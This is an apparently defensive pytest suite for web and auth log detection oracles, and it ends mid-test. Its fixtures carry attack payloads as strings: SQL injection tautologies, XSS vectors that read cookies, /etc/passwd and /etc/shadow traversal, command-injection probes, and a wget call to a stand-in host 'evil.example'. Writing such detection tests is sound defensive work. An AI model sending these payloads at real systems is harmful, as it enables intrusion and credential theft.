"""
WS4-detection — the AEGIS Detection Mirror edge-plane oracles.

The load-bearing property under test is the SOVEREIGN INVARIANT: a detection is a FACT ONLY when the
deterministic oracle FIRES over retained telemetry AND the signed PCF certificate RE-VERIFIES offline
(signature + evidence digest + a live oracle RE-RUN over the embedded evidence). Anything softer is a
LEAD, never a silent block. Every oracle ships a BENIGN TWIN that must NOT fire (the false-positive
control — a benign twin that fires is a BLOCK). Oracles are pure/deterministic (no clock/RNG — windows
come from the records' own ts/seq), total on malformed telemetry, secret-free, and offense-free.

``TestSovereignInvariant`` is the explicit adversarial pass: the red-pen tries to make benign traffic
fire, to forge a FACT (by hand, by key, by evidence swap, by field tamper), and to smuggle a secret onto
the spine — each attempt must fail closed.
"""

from __future__ import annotations

from pathlib import Path

import pytest

import vigil_integration.detection as d
from vigil_core import generate_keypair, sign, verify_one
from vigil_integration.agent.state import Finding
from vigil_integration.detection import (
    BruteForceOracle,
    CmdInjectionOracle,
    CmsEnumerationOracle,
    CrlfInjectionOracle,
    ForcedBrowsingOracle,
    Grade,
    PasswordSprayOracle,
    PathTraversalOracle,
    PortScanOracle,
    ScannerFingerprintOracle,
    SqliStructureOracle,
    WafProbeOracle,
    XssStructureOracle,
    parse_access_log,
    parse_auth_log,
    parse_clf_time,
    parse_conn_log,
    resolve_oracle,
    reverify_certificate,
    run_access_detections,
    run_all_detections,
    run_auth_detections,
    run_conn_detections,
)

# ---------------------------------------------------------------------------------------------------
# builders + fixtures
# ---------------------------------------------------------------------------------------------------

TS = "21/Jul/2026:15:26:30"


def aline(target, *, ua="curl/8.20.0", status=200, size=91, src="127.0.0.1", ts=TS,
          method="GET", ref="-") -> str:
    return f'{src} - - [{ts} ] "{method} {target} HTTP/1.1" {status} {size} "{ref}" "{ua}"'


def authline(user, result, *, src="10.0.0.9", ts=TS) -> str:
    return f"{ts}  src={src} user={user} result={result}"


def connline(dport, *, src="10.0.0.9", dst="127.0.0.1", proto="tcp", ts=TS) -> str:
    return f"{ts}  src={src} dst={dst} dport={dport} proto={proto}"


@pytest.fixture
def kp():
    return generate_keypair()


@pytest.fixture
def signer(kp):
    priv = kp.private_key_b64
    return lambda b: sign(priv, b)


@pytest.fixture
def wire(kp, signer):
    """The injected FACT-minting seam: (signer, verify_key, key_id)."""
    return {"signer": signer, "verify_key": kp.public_key_b64, "key_id": "defender-k1"}


# A live SQLi payload as it reaches the edge (percent-encoded ' OR '1'='1).
SQLI_TGT = "/search?q=x%27%20OR%20%271%27%3D%271"
XSS_TGT = "/search?q=<script>alert(1)</script>"
TRAV_TGT = "/file?path=../../etc/passwd"


# ---------------------------------------------------------------------------------------------------
# parsers
# ---------------------------------------------------------------------------------------------------


class TestParsers:
    def test_clf_parse_fields(self):
        rec = parse_access_log(aline(SQLI_TGT))[0]
        assert rec.src == "127.0.0.1"
        assert rec.method == "GET"
        assert rec.route == "/search"
        assert rec.status == 200
        assert rec.user_agent == "curl/8.20.0"
        # percent-decoding exposes the true structure the raw target hides
        assert "' OR '1'='1" in rec.decoded_target
        assert rec.ts == parse_clf_time(TS) and rec.ts is not None

    def test_clf_trailing_space_and_missing_tz(self):
        # the loopback logs write "[..:30 ]" with a trailing space and no timezone
        assert parse_clf_time("21/Jul/2026:15:26:30 ") == parse_clf_time("21/Jul/2026:15:26:30")

    def test_time_parse_is_pure_and_deterministic(self):
        # same string → same epoch, twice (no clock)
        assert parse_clf_time(TS) == parse_clf_time(TS)
        assert parse_clf_time("01/Jan/1970:00:00:00") == 0
        assert parse_clf_time("02/Jan/1970:00:00:00") == 86400

    def test_auth_and_conn_parse(self):
        a = parse_auth_log(authline("admin", "failure"))[0]
        assert a.user == "admin" and a.is_failure and a.src == "10.0.0.9"
        c = parse_conn_log(connline(22))[0]
        assert c.dport == 22 and c.proto == "tcp"

    @pytest.mark.parametrize("bad", [None, 123, "", "\x00\xff garbage", "not a log line",
                                     "] [ malformed \" \"", "a=b=c d e f"])
    def test_parsers_total_on_malformed(self, bad):
        # never raise; a non-str yields [], a garbage line yields a signal-free record
        assert isinstance(parse_access_log(bad), list)
        assert isinstance(parse_auth_log(bad), list)
        assert isinstance(parse_conn_log(bad), list)

    def test_malformed_line_matches_no_signature(self):
        recs = parse_access_log("this is not a CLF line at all")
        assert len(recs) == 1 and recs[0].decoded_target == ""
        assert SqliStructureOracle().detect(recs) is None


# ---------------------------------------------------------------------------------------------------
# injection oracles — fires on the true structure, silent on the benign twin
# ---------------------------------------------------------------------------------------------------


class TestInjectionOracles:
    def test_sqli_fires_on_structures(self, wire):
        for tgt in [SQLI_TGT, "/s?id=1%20UNION%20SELECT%20a%2Cb", "/s?id=1%27--",
                    "/s?id=1%20AND%20SLEEP%285%29"]:
            det = SqliStructureOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact, tgt

    @pytest.mark.parametrize("benign", [
        "/s?q=please%20select%20a%20plan%20that%20fits",   # 'select' in prose
        "/u?name=O%27Reilly",                              # apostrophe in a name
        "/f?filter=price%20or%20discount",                 # bare 'or' between words
        "/c?comment=I%20love%20SQL%20and%20databases",     # keywords in prose
        # RED-PEN HIGH-2: a legitimate boolean filter DSL (field=value / field<op>value behind and/or)
        # must NOT fire — the tautology now requires numeric-literal or self-equal operands.
        "/books?filter=type%3Dnovel%20and%20year%3D2024",  # faceted filter: type=novel AND year=2024
        "/t?q=price%3E10%20and%20price%3C20",              # range filter: price>10 AND price<20
        "/e?f=status%3Dopen%20or%20status%3Dpending",      # field=word OR field=word
        "/s?q=shoes%20and%20socks",                        # 'and' in prose (no operator)
    ])
    def test_sqli_benign_twin_silent(self, benign, wire):
        assert SqliStructureOracle().detect(parse_access_log(aline(benign)), **wire) is None

    def test_sqli_fires_on_numeric_and_selfequal_tautology(self, wire):
        # RED-PEN HIGH-2 positive lock: after tightening, a GENUINE tautology (numeric-literal or
        # self-equal operands, or a quote-break) still mints a FACT — the fix narrows, never blinds.
        for tgt in ["/s?id=1%20OR%201%3D1",             # OR 1=1        (numeric literals)
                    "/s?id=1%20AND%202%3C%3E3",         # AND 2<>3      (numeric literals)
                    "/s?id=1%20OR%20x%3Dx",             # OR x=x        (self-equal operands)
                    "/s?q=a%27%20OR%20%27a%27%3D%27a"]:  # a' OR 'a'='a  (quoted self-equal / quote-break)
            det = SqliStructureOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact and det.signature_kind == "sql-tautology", tgt

    def test_xss_fires(self, wire):
        for tgt in [XSS_TGT, "/s?q=<img%20src=x%20onerror=alert(1)>",
                    "/s?u=javascript:alert(document.cookie)"]:
            det = XssStructureOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact, tgt

    @pytest.mark.parametrize("benign", [
        "/c?comment=%26lt%3Bscript%26gt%3Balert%26lt%3B%2Fscript%26gt%3B",  # escaped HTML
        "/p?onboarding=true",                                # onboarding= (not an event handler)
        "/q?text=how%20to%20use%20onclick%20in%20javascript",  # words in prose
    ])
    def test_xss_benign_twin_silent(self, benign, wire):
        assert XssStructureOracle().detect(parse_access_log(aline(benign)), **wire) is None

    def test_traversal_fires(self, wire):
        for tgt in [TRAV_TGT, "/f?path=..%2f..%2fetc%2fpasswd", "/f?p=%2e%2e%2f%2e%2e%2fetc%2fshadow"]:
            det = PathTraversalOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact, tgt

    @pytest.mark.parametrize("benign", [
        "/f?file=report..2024.pdf", "/d?path=/var/www/html/index.html", "/v?ver=1.2.3"])
    def test_traversal_benign_twin_silent(self, benign, wire):
        assert PathTraversalOracle().detect(parse_access_log(aline(benign)), **wire) is None

    def test_crlf_fires(self, wire):
        for tgt in ["/p?u=a%0d%0aSet-Cookie:evil=1", "/p?u=a%0aX-Injected:1", "/p?x=v%00"]:
            det = CrlfInjectionOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact, tgt

    @pytest.mark.parametrize("benign", ["/x?color=0affff", "/r?ref=https://a.example/c", "/q?s=a0d0a"])
    def test_crlf_benign_twin_silent(self, benign, wire):
        assert CrlfInjectionOracle().detect(parse_access_log(aline(benign)), **wire) is None

    def test_cmd_fires(self, wire):
        for tgt in ["/p?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd", "/p?x=%24%28id%29",
                    "/p?h=a%7Cwhoami%20-a", "/p?u=x%3Bwget%20https%3A%2F%2Fevil.example%2Fx"]:
            det = CmdInjectionOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact, tgt

    @pytest.mark.parametrize("benign", [
        "/q?msg=Tom%20%26%20Jerry",            # single & URL separator
        "/l?items=dog%3Bcat%3Bbird",           # ;-separated list, no command args
        "/s?q=salt%20and%20pepper",            # prose
        "/n?x=1%7C2",                          # a|b, not a command
        # RED-PEN HIGH-1: a ;/matrix-delimited value whose token merely EQUALS a binary name (and 'id'
        # is the single most common identifier token) must NOT fire — cmd-binary now requires the binary
        # at end-of-value or followed by an argument, so a bare ';id' inside a delimited list is silent.
        "/catalog;id=123;view=full",           # RFC-3986 matrix params, ;id= assignment
        "/p?fields=name;id;email",             # sparse fieldset (JSON:API), ;id; in a list
        "/menu;chmod=755",                     # matrix value equal to a binary name (;chmod=)
        "/a;uname=bob;id=7",                    # ;uname= / ;id= assignments
    ])
    def test_cmd_benign_twin_silent(self, benign, wire):
        assert CmdInjectionOracle().detect(parse_access_log(aline(benign)), **wire) is None

    def test_cmd_binary_requires_command_structure(self, wire):
        # RE-CHECK HIGH: a binary fires ONLY with genuine command structure — a following ARGUMENT
        # (whitespace + a token), a $()/backtick substitution, or a known injection-arg. A BARE binary
        # token (even at end-of-value, ;id / |whoami) is silenced (ambiguous with a field name), so this
        # test locks the positives to real command structure — the fix silences look-alikes, not injection.
        for tgt in ["/p?h=x%3Bid%20-a",             # ;id -a     (binary + argument)
                    "/p?h=x%3Bwhoami%20now",        # ;whoami now
                    "/p?h=x%3Bchmod%20755%20%2Ftmp%2Fx",   # ;chmod 755 /tmp/x
                    "/p?h=%24%28whoami%29",         # $(whoami)  (subshell)
                    "/p?h=x%3Bcat%20%2Fetc%2Fpasswd"]:     # ;cat /etc/passwd (known-arg)
            det = CmdInjectionOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact, tgt

    def test_cmd_benign_twin_end_of_value_and_prose_silent(self, wire):
        # RE-CHECK MEDIUM (green-wash): the negative control must cover the CLASS — a binary-name token at
        # END-OF-VALUE (not just the middle) and in prose, across ; | && and encoded separators.
        for tgt in ["/p?fields=name;email;id",       # 'id' token at END-OF-VALUE (the actual firing case)
                    "/p?columns=first|last|id",       # '|id' at end-of-value
                    "/p?sort=id|name;chmod",          # 'chmod' at end-of-value
                    "/p?note=see the id field for chmod usage",  # binary names in prose
                    "/p?f=name%3Bemail%3Bid",         # encoded ';id' at end-of-value
                    "/p?g=a%7Cb%7Cwhoami",            # encoded '|whoami' at end-of-value
                    "/a;uname=bob;id=7;chmod=755"]:    # matrix params, all bare tokens
            assert CmdInjectionOracle().detect(parse_access_log(aline(tgt)), **wire) is None, tgt

    def test_crlf_and_xss_edge_posture_is_measured(self, wire):
        # RED-PEN LOW-5 / INFO-6: measure (not assume) the false-positive posture of the more ambiguous
        # in-path shapes. The DECISION: a literal CR/LF/NUL control char in the request target and a raw
        # angle-bracket vector tag are genuinely anomalous (classic reflected-XSS / CRLF-smuggling probes)
        # → they FIRE. Their look-alikes that carry the token WITHOUT the anomalous structure stay silent
        # — that is the real negative control.
        # CRLF: a GET-borne %0A multiline value carries a real newline in the target → FACT ...
        for tgt in ["/comment?body=line1%0Aline2", "/p?u=a%0d%0aSet-Cookie:evil%3D1"]:
            det = CrlfInjectionOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact and det.signature_kind.startswith("crlf-"), tgt
        # ... but the mere TEXT "0a"/"0d0a" (no decoded control char) does NOT fire.
        for benign in ["/x?color=0affff", "/q?s=a0d0a", "/api?note=use%20version%200a%20of%20the%20lib"]:
            assert CrlfInjectionOracle().detect(parse_access_log(aline(benign)), **wire) is None, benign
        # XSS: a raw reflected <img>/<form> tag in the query → FACT ...
        for tgt in ["/search?q=%3Cimg%20src%3Dlogo.png%3E", "/x?q=%3Cform%3E"]:
            det = XssStructureOracle().detect(parse_access_log(aline(tgt)), **wire)
            assert det is not None and det.is_fact and det.signature_kind == "xss-vector-tag", tgt
        # ... but the tag NAME as a bare word (no angle brackets) does NOT fire.
        for benign in ["/gallery?tag=img", "/f?type=form&name=contact", "/q?text=embed%20a%20video"]:
            assert XssStructureOracle().detect(parse_access_log(aline(benign)), **wire) is None, benign


# ---------------------------------------------------------------------------------------------------
# recon oracles
# ---------------------------------------------------------------------------------------------------


class TestReconOracles:
    def test_port_scan_fires(self, wire):
        log = "\n".join(connline(p) for p in range(20, 45))  # 25 distinct ports, one src
        det = PortScanOracle().detect(parse_conn_log(log), **wire)
        assert det is not None and det.is_fact and det.signature_kind == "port-sweep"

    def test_port_scan_benign_monitor_silent(self, wire):
        # uptime monitor: one fixed port, many times → port-spread 1
        log = "\n".join(connline(443, ts=f"21/Jul/2026:15:{m:02d}:00") for m in range(30))
        assert PortScanOracle().detect(parse_conn_log(log), **wire) is None

    def test_forced_browsing_fires(self, wire):
        log = "\n".join(aline(f"/admin/{i}", status=404, src="10.0.0.9") for i in range(15))
        det = ForcedBrowsingOracle().detect(parse_access_log(log), **wire)
        assert det is not None and det.is_fact

    def test_forced_browsing_benign_crawler_silent(self, wire):
        # a crawler fetches many DISTINCT real pages (200s), few 404s
        log = "\n".join(aline(f"/page/{i}", status=200, src="66.249.66.1", ua="Googlebot/2.1")
                        for i in range(40))
        assert ForcedBrowsingOracle().detect(parse_access_log(log), **wire) is None

    def test_scanner_ua_is_fact_paths_are_lead(self, wire):
        # a self-identifying scanner UA → FACT
        det = ScannerFingerprintOracle().detect(parse_access_log(aline("/", ua="Nuclei - v3")), **wire)
        assert det is not None and det.is_fact and det.signature_kind.startswith("scanner-ua:")
        # a discovery-path burst (no scanner UA) → LEAD (never a silent FACT)
        burst = "\n".join(aline(p, status=404)
                          for p in ["/.git/config", "/.env", "/server-status", "/phpmyadmin"])
        lead = ScannerFingerprintOracle().detect(parse_access_log(burst), **wire)
        assert lead is not None and lead.grade is Grade.LEAD and not lead.is_fact
        assert lead.certificate is None and lead.finding.evidence_ref == ""

    def test_scanner_benign_curl_monitor_silent(self, wire):
        # curl is NOT a scanner UA (used by monitors); a normal path → silent
        assert ScannerFingerprintOracle().detect(parse_access_log(aline("/health")), **wire) is None

    def test_cms_enumeration_fires(self, wire):
        log = "\n".join(aline(f"/wp-content/plugins/plug{i}/readme.txt") for i in range(6))
        det = CmsEnumerationOracle().detect(parse_access_log(log), **wire)
        assert det is not None and det.is_fact

    def test_cms_benign_visitor_silent(self, wire):
        log = "\n".join([aline("/wp-login.php"), aline("/wp-content/themes/x/style.css")])
        assert CmsEnumerationOracle().detect(parse_access_log(log), **wire) is None

    def test_waf_probe_is_lead_only(self, wire):
        # multi-class burst from one source — a WAF fingerprint pattern → LEAD, never FACT
        log = "\n".join(aline(t) for t in [SQLI_TGT, XSS_TGT, TRAV_TGT])
        det = WafProbeOracle().detect(parse_access_log(log), **wire)
        assert det is not None and det.grade is Grade.LEAD and not det.is_fact
        # wafw00f UA is also LEAD only
        ua = WafProbeOracle().detect(parse_access_log(aline("/", ua="wafw00f/2.2")), **wire)
        assert ua is not None and ua.grade is Grade.LEAD

    def test_waf_probe_benign_silent(self, wire):
        assert WafProbeOracle().detect(parse_access_log(aline("/home")), **wire) is None


# ---------------------------------------------------------------------------------------------------
# credential oracles
# ---------------------------------------------------------------------------------------------------


class TestCredentialOracles:
    def test_brute_force_fires(self, wire):
        log = "\n".join(authline("admin", "failure", ts=f"21/Jul/2026:15:26:{30 + i:02d}")
                        for i in range(10))
        det = BruteForceOracle().detect(parse_auth_log(log), **wire)
        assert det is not None and det.is_fact

    def test_brute_force_benign_mistype_silent(self, wire):
        log = "\n".join([authline("alice", "failure")] * 3 + [authline("alice", "success")])
        assert BruteForceOracle().detect(parse_auth_log(log), **wire) is None

    def test_brute_force_works_on_seq_axis_when_ts_absent(self, wire):
        # lines with an UNPARSEABLE timestamp → ts=None → the window falls back to record position
        log = "\n".join("NO_TS  src=10.0.0.9 user=admin result=failure" for _ in range(10))
        recs = parse_auth_log(log)
        assert all(r.ts is None for r in recs)
        det = BruteForceOracle().detect(recs, **wire)
        assert det is not None and det.is_fact

    def test_password_spray_fires(self, wire):
        log = "\n".join(authline(f"user{i}", "failure", ts=f"21/Jul/2026:15:27:{i:02d}")
                        for i in range(10))
        det = PasswordSprayOracle().detect(parse_auth_log(log), **wire)
        assert det is not None and det.is_fact

    def test_spray_benign_login_surge_silent(self, wire):
        # a legitimate surge: many distinct users SUCCEEDING (no cross-account failures)
        log = "\n".join(authline(f"user{i}", "success", ts=f"21/Jul/2026:15:27:{i:02d}")
                        for i in range(15))
        assert PasswordSprayOracle().detect(parse_auth_log(log), **wire) is None

    def test_deep_brute_is_not_spray(self, wire):
        # one account, many failures = brute (spread 1), must NOT trip the spray oracle
        log = "\n".join(authline("admin", "failure", ts=f"21/Jul/2026:15:27:{i:02d}")
                        for i in range(12))
        assert PasswordSprayOracle().detect(parse_auth_log(log), **wire) is None


# ---------------------------------------------------------------------------------------------------
# certificate — mint + offline re-verification (re-execution, not string trust)
# ---------------------------------------------------------------------------------------------------


class TestCertificate:
    def test_fact_mints_reverifiable_certificate(self, kp, wire):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)), **wire)
        cert = det.certificate
        assert cert is not None and cert.verdict == "fact"
        assert det.finding.status == "fact" and det.finding.evidence_ref == cert.cert_id
        # re-verifies offline under the defender's public key
        assert reverify_certificate(cert, kp.public_key_b64) is True
        # the signature is a genuine Ed25519 signature over the canonical payload
        assert verify_one(kp.public_key_b64, cert.signing_bytes(), cert.signature) is True

    def test_reverify_fails_under_wrong_key(self, wire):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)), **wire)
        other = generate_keypair()
        assert reverify_certificate(det.certificate, other.public_key_b64) is False

    def test_tampered_evidence_fails_reverify(self, kp, wire):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)), **wire)
        forged = det.certificate.model_copy(update={"evidence": ["a perfectly benign line"]})
        assert reverify_certificate(forged, kp.public_key_b64) is False

    def test_tampered_verdict_or_kind_fails_reverify(self, kp, wire):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)), **wire)
        for upd in ({"signature_kind": "sql-union"}, {"oracle": "xss_structure"},
                    {"severity": "critical"}, {"evidence_digest_hex": "0" * 64}):
            assert reverify_certificate(det.certificate.model_copy(update=upd), kp.public_key_b64) is False

    def test_reverify_requires_reexecution(self, kp, wire):
        # a certificate whose evidence does NOT actually reproduce the fire cannot re-verify even with a
        # matching digest — the oracle is RE-RUN over the embedded evidence.
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)), **wire)
        benign_line = d.redact_evidence([aline("/s?q=hello%20world")])
        forged = det.certificate.model_copy(update={
            "evidence": benign_line, "evidence_digest_hex": d.evidence_digest(benign_line)})
        # digest now matches the (benign) evidence, but the sqli oracle no longer fires over it → False.
        assert reverify_certificate(forged, kp.public_key_b64) is False


# ---------------------------------------------------------------------------------------------------
# fail-closed
# ---------------------------------------------------------------------------------------------------


class TestFailClosed:
    def test_no_signer_degrades_fact_to_lead(self):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)))
        assert det is not None and det.grade is Grade.LEAD and not det.is_fact
        assert det.finding.status == "lead" and det.finding.evidence_ref == ""

    def test_no_verify_key_degrades_to_lead(self, signer):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)),
                                           signer=signer, verify_key="")
        assert det is not None and not det.is_fact

    def test_raising_signer_degrades_to_lead(self, kp):
        def boom(_b):
            raise RuntimeError("signer down")
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)),
                                           signer=boom, verify_key=kp.public_key_b64)
        assert det is not None and not det.is_fact and det.certificate is None

    def test_empty_signature_degrades_to_lead(self, kp):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)),
                                           signer=lambda _b: "  ", verify_key=kp.public_key_b64)
        assert det is not None and not det.is_fact


# ---------------------------------------------------------------------------------------------------
# totality — no public entrypoint raises on attacker-shaped telemetry
# ---------------------------------------------------------------------------------------------------


class TestTotality:
    @pytest.mark.parametrize("bad", [None, 123, "", b"bytes", "\x00\xff",
                                     "x" * 200000, "a=b " * 5000, "'" * 40000])
    def test_run_helpers_total(self, bad, wire):
        # never raise, always a list — including on pathological (ReDoS-shaped) single lines
        assert isinstance(run_access_detections(bad, **wire), list)
        assert isinstance(run_auth_detections(bad, **wire), list)
        assert isinstance(run_conn_detections(bad, **wire), list)
        assert isinstance(run_all_detections(access_log=bad, conn_log=bad, auth_log=bad, **wire), list)

    def test_evaluate_total_on_non_list(self):
        for oracle in (SqliStructureOracle(), PortScanOracle(), BruteForceOracle(), WafProbeOracle()):
            assert oracle.detect(None) is None
            assert oracle.detect("not records") is None
            assert oracle.detect(123) is None

    def test_long_line_is_fast_and_silent(self, wire):
        # the ReDoS regression: a 200k-char single line must not hang and must not fire
        import time
        t = time.perf_counter()
        out = run_auth_detections("z" * 200000, **wire) + run_access_detections("z" * 200000, **wire)
        assert (time.perf_counter() - t) < 5.0
        assert out == []


# ---------------------------------------------------------------------------------------------------
# secret-free
# ---------------------------------------------------------------------------------------------------


class TestSecretFree:
    def test_secret_masked_in_certificate_evidence(self, kp, wire):
        # a genuine secret rides alongside the payload; the FACT still mints, secret masked on the spine
        line = aline("/file?path=../../etc/passwd&token=SUPERSECRETVALUE")
        det = PathTraversalOracle().detect(parse_access_log(line), **wire)
        assert det is not None and det.is_fact
        joined = "\n".join(det.certificate.evidence)
        assert "SUPERSECRETVALUE" not in joined      # secret redacted before signing
        assert "etc/passwd" in joined                 # the attack signal survives
        assert reverify_certificate(det.certificate, kp.public_key_b64) is True

    def test_returned_detection_summary_is_secret_free(self, kp, wire):
        # RED-PEN MEDIUM-3: the TRANSPORT object handed to the orchestrator/recorder must also be clean —
        # the returned Detection.summary is scrubbed through the same F3 redactor as the certificate, so a
        # credential in the request target never rides out on the object even though the spine is clean.
        secret = "SUPERSECRET123"
        tgt = f"/f?q=1%27%20OR%20%271%27%3D%271&apikey={secret}"
        # FACT path (signer wired) — summary redacted, spine artifacts already clean.
        fact = SqliStructureOracle().detect(parse_access_log(aline(tgt)), **wire)
        assert fact is not None and fact.is_fact
        assert secret not in fact.summary and "apikey=" in fact.summary and "••••" in fact.summary
        assert secret not in "\n".join(fact.certificate.evidence)
        assert secret not in fact.certificate.summary
        # LEAD path (no signer) — the same redaction applies to the downgraded transport object.
        lead = SqliStructureOracle().detect(parse_access_log(aline(tgt)))
        assert lead is not None and not lead.is_fact
        assert secret not in lead.summary and "••••" in lead.summary


# ---------------------------------------------------------------------------------------------------
# telemetry / egress stubs — LEAD only, honest, never faked
# ---------------------------------------------------------------------------------------------------


class TestTelemetryStubs:
    @pytest.mark.parametrize("domain", ["c2", "identity_graph", "cloud", "session"])
    def test_stub_is_lead_only_and_honest(self, domain):
        stub = d.telemetry_stub(domain)
        assert stub is not None and stub.available() is False and stub.fact_possible is False
        det = stub.assess("analyst saw something odd")
        assert det.grade is Grade.LEAD and not det.is_fact
        assert det.certificate is None and det.finding.evidence_ref == ""
        assert "absent" in det.note and "needs" in det.note

    def test_stub_never_fakes_a_fact(self):
        # no amount of "suspicion" text can turn a stub into a FACT (telemetry is absent)
        for domain, stub in d.TELEMETRY_STUBS.items():
            det = stub.assess("CONFIRMED beacon to 1.2.3.4 every 60s")
            assert det.finding.status == "lead"

    def test_unknown_domain_is_none(self):
        assert d.telemetry_stub("quantum") is None


# ---------------------------------------------------------------------------------------------------
# determinism + no clock/RNG
# ---------------------------------------------------------------------------------------------------


class TestDeterminismNoClock:
    def test_same_input_same_certificate(self, wire):
        a = run_access_detections(aline(SQLI_TGT), **wire)
        b = run_access_detections(aline(SQLI_TGT), **wire)
        fa = [x.finding.evidence_ref for x in d.facts(a)]
        fb = [x.finding.evidence_ref for x in d.facts(b)]
        assert fa == fb and len(fa) >= 1        # byte-identical cert ids → deterministic

    def test_no_wallclock_or_rng_imports(self):
        # AST-based (not substring) so docstrings mentioning "datetime.now" don't false-positive: a clock
        # or RNG call is impossible without importing its module, so barring the imports is sufficient.
        import ast
        banned = {"time", "random", "datetime", "uuid", "secrets"}
        pkg = Path(d.__file__).parent
        for src in pkg.glob("*.py"):
            tree = ast.parse(src.read_text())
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for a in node.names:
                        assert a.name.split(".")[0] not in banned, f"{src.name} imports {a.name}"
                elif isinstance(node, ast.ImportFrom):
                    root = (node.module or "").split(".")[0]
                    assert root not in banned, f"{src.name} imports from {node.module}"


# ---------------------------------------------------------------------------------------------------
# THE SOVEREIGN INVARIANT — the explicit adversarial pass
# ---------------------------------------------------------------------------------------------------


class TestSovereignInvariant:
    def test_a_fact_cannot_be_forged_by_hand(self):
        # the type-level guard: a FACT-status Finding requires a non-empty signed evidence ref
        with pytest.raises(Exception):
            Finding(ref="x", status="fact", evidence_ref="")
        with pytest.raises(Exception):
            Finding(ref="x", status="fact", evidence_ref="   ")

    def test_benign_traffic_never_produces_a_fact(self, wire):
        # the red-pen throws a battery of legitimate look-alikes at EVERY plane; none may reach FACT
        benign_access = [
            aline("/s?q=please%20select%20a%20plan"), aline("/u?name=O%27Reilly"),
            aline("/c?comment=%26lt%3Bscript%26gt%3B"), aline("/p?onboarding=true"),
            aline("/f?file=report..2024.pdf"), aline("/x?color=0affff"),
            aline("/l?items=dog%3Bcat"), aline("/health", ua="curl/8.20.0"),
            aline("/wp-login.php"), aline("/api/v1/users?author=me"),
            # RED-PEN HIGH-1/HIGH-2 look-alikes, run through the WHOLE access-oracle set: matrix/fieldset
            # tokens equal to a binary name, and legitimate filter-DSL comparisons — none may reach FACT.
            aline("/catalog;id=123;view=full"), aline("/p?fields=name;id;email"),
            aline("/menu;chmod=755"), aline("/books?filter=type%3Dnovel%20and%20year%3D2024"),
            aline("/t?q=price%3E10%20and%20price%3C20"), aline("/gallery?tag=img"),
        ]
        benign_auth = [authline("alice", "failure"), authline("alice", "success"),
                       authline("bob", "success"), authline("carol", "success")]
        benign_conn = [connline(443), connline(80), connline(443)]
        dets = run_all_detections(
            access_log="\n".join(benign_access), auth_log="\n".join(benign_auth),
            conn_log="\n".join(benign_conn), **wire)
        assert d.facts(dets) == [], f"benign traffic fired a FACT: {[x.oracle for x in d.facts(dets)]}"

    def test_cannot_forge_a_fact_with_your_own_key(self, kp, wire):
        # an attacker mints a well-formed certificate (evidence really fires) but signs it with THEIR
        # key. The defender re-verifies under the DEFENDER's public key → rejected (no keyless forgery).
        attacker = generate_keypair()
        det = SqliStructureOracle().detect(
            parse_access_log(aline(SQLI_TGT)),
            signer=lambda b: sign(attacker.private_key_b64, b),
            verify_key=attacker.public_key_b64, key_id="attacker")
        assert det.is_fact  # valid under the ATTACKER's own key
        # but under the defender's trust root it does not re-verify
        assert reverify_certificate(det.certificate, kp.public_key_b64) is False

    def test_cross_oracle_evidence_swap_fails(self, kp, wire):
        # take a real XSS FACT and paste an SQLi cert's evidence under it → re-run of the XSS oracle over
        # SQLi evidence does not fire → the swap cannot re-verify
        xss = XssStructureOracle().detect(parse_access_log(aline(XSS_TGT)), **wire)
        sqli = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)), **wire)
        swapped = xss.certificate.model_copy(update={
            "evidence": sqli.certificate.evidence,
            "evidence_digest_hex": d.evidence_digest(sqli.certificate.evidence)})
        assert reverify_certificate(swapped, kp.public_key_b64) is False

    def test_unsigned_certificate_never_verifies(self, kp, wire):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)), **wire)
        unsigned = det.certificate.model_copy(update={"signature": ""})
        assert d.verify_certificate_signature(unsigned, kp.public_key_b64) is False
        assert reverify_certificate(unsigned, kp.public_key_b64) is False

    def test_unknown_oracle_in_cert_cannot_reverify(self, kp, wire):
        det = SqliStructureOracle().detect(parse_access_log(aline(SQLI_TGT)), **wire)
        # even if re-signed consistently, an unknown oracle name cannot be resolved → re-run impossible
        forged = det.certificate.model_copy(update={"oracle": "totally_unknown_oracle"})
        assert reverify_certificate(forged, kp.public_key_b64) is False
        assert resolve_oracle("totally_unknown_oracle") is None

    def test_lead_carries_no_evidence_ref_and_no_certificate(self, wire):
        # every LEAD (native or downgraded) is honest: never a silent block, never a signed ref
        lead = WafProbeOracle().detect(
            parse_access_log("\n".join(aline(t) for t in [SQLI_TGT, XSS_TGT, TRAV_TGT])), **wire)
        assert lead.grade is Grade.LEAD and lead.certificate is None
        assert lead.finding.status == "lead" and lead.finding.evidence_ref == ""


# ---------------------------------------------------------------------------------------------------
# live substrate — the oracles run over the real loopback logs without crashing
# ---------------------------------------------------------------------------------------------------


class TestLiveSubstrate:
    def test_runs_over_live_loopback_logs(self, kp, wire):
        access = Path("/tmp/vigil-loopback-logs/access.log")
        auth = Path("/tmp/vigil-loopback-logs/auth.log")
        if not access.exists():
            pytest.skip("loopback logs not present")
        dets = run_access_detections(access.read_text(), **wire)
        # every FACT emitted over the real log re-verifies offline
        for det in d.facts(dets):
            assert reverify_certificate(det.certificate, kp.public_key_b64) is True
        if auth.exists():
            assert isinstance(run_auth_detections(auth.read_text(), **wire), list)

    def test_known_loopback_payloads_fire(self, wire):
